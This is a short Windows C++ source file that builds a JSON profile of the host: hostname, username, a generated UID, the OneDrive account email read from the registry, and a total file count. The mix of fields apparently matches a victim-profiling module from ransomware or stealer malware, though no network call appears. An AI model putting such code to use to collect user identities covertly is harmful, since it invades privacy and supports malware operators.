#include "profiler.h"
#include <windows.h>
#include <map>
#include <string>


std::string get_email() {
    HKEY hKey;
    const char* regPath = "SOFTWARE\\Microsoft\\OneDrive\\Accounts\\Personal";
    char userEmailAddr[256];
    DWORD userEmailAddrSize = sizeof(userEmailAddr);
    long lResult = RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_READ, &hKey);
    if (lResult == ERROR_SUCCESS) {
        lResult = RegQueryValueExA(hKey, "UserEmail", NULL, NULL, (LPBYTE)userEmailAddr, &userEmailAddrSize);
        RegCloseKey(hKey);
        if (lResult == ERROR_SUCCESS) {
            return std::string(userEmailAddr);
        }
    }
    return "";
}



nlohmann::json profiler(std::string filesCount) {
    std::map<std::string, std::string> profile;
    char buffer[256];
    DWORD size = 256;

    // Get hostname
    if (GetComputerNameA(buffer, &size)) {
        profile["hostname"] = buffer;
    }

    // Get username
    size = 256;
    if (GetUserNameA(buffer, &size)) {
        profile["username"] = buffer;
    }

    // Get UID
    profile["uid"] = gen_uid();


    // Get email
    profile["email"] = get_email();

    // Get total file count
    profile["files"] = filesCount;

    // Convert the map to JSON and return it
    nlohmann::json jsonProfile = profile;
    return jsonProfile;
}


